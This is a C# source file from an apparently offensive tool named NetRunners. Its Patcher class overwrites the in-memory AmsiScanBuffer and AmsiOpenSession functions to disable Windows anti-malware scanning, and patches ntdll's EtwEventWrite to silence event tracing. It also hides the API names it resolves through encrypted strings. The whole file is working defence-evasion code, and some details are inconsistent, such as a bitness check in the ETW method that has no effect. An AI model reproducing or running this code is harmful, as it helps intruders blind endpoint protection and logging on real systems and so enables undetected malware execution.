using System;
using System.Runtime.InteropServices;
using static NetRunners.Data.Delegates;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Patchers
{
    /// <summary>
    /// Contains AMSI binary patching method
    /// </summary>
    public static class Patcher
    {
        // patches AmsiOpenSession's first test instruction to xor, triggering conditional jump to invalid argument
        public static bool PatchAmsi()
        {
            try
            {
                byte[] patch;

                // define patch var using bitness
                if (IntPtr.Size == 8)
                {
                    patch = new byte[] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 };
                }
                else 
                {
                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
                }

                // get amsi.dll pointer
                IntPtr Library = LoadLibraryA(Decrypt(amsidll_Byte));
                if (Library == IntPtr.Zero)
                    throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");

                //////// AMSISCANBUFFER
                // get amsiscanbuffer pointer
                IntPtr funcAddress = GetProcAddress(Library, Decrypt(AmsiScanBuffer_Byte));
                if (funcAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");

                // fix memory protections of amsiscanbuffer
                VirtualProtect(funcAddress, (UIntPtr)3, 0x40, out oldProtect);

                // patch bytes using our payload
                Marshal.Copy(patch, 0, funcAddress, patch.Length);

                // restore memory protection
                VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out oldProtect);
                //return true;

                //////// AMSIOPENSESSION
                if (IntPtr.Size == 8)
                {
                    patch = new byte[8];
                }
                else
                {
                    patch = new byte[4];
                }

                // get amsiopensession pointer
                funcAddress = GetProcAddress(Library, Decrypt(AmsiOpenSession_Byte));
                if (funcAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");

                // fix memory protections of amsiopensession
                VirtualProtect(funcAddress, (UIntPtr)3, 0x40, out oldProtect);

                // patch bytes using our payload
                Marshal.Copy(patch, 0, funcAddress, patch.Length);

                // restore memory protection
                VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out oldProtect);
                
                Console.WriteLine("[+] Successfully Patched AMSI!");
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred while patching AMSI: {e.Message}");
                throw;
            }
        }
        public static bool PatchEtw() // credits: https://github.com/Flangvik/NetLoader
        {
            try
            {
                byte[] patch;

                // define patch variable using bitness
                if (IntPtr.Size == 4)
                    patch = Convert.FromBase64String("whQA");
                patch = Convert.FromBase64String("ww==");

                // get ntdll.dll pointer
                IntPtr Library = LoadLibraryA("ntdll.dll");
                if (Library == IntPtr.Zero)
                    throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");

                // get EtwEventWrite pointer
                IntPtr funcAddress = GetProcAddress(Library, Decrypt(EtwEventWrite_Byte));
                if (funcAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");

                // fix memory protections of etweventwrite function
                VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);

                // overwrite function
                Marshal.Copy(patch, 0, funcAddress, patch.Length);

                // restore memory protection of etweventwrite
                VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out oldProtect);
                Console.WriteLine("[+] Successfully Patched ETW!");
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred while patching ETW: {e.Message}");
                throw;
            }
        }
    }
}
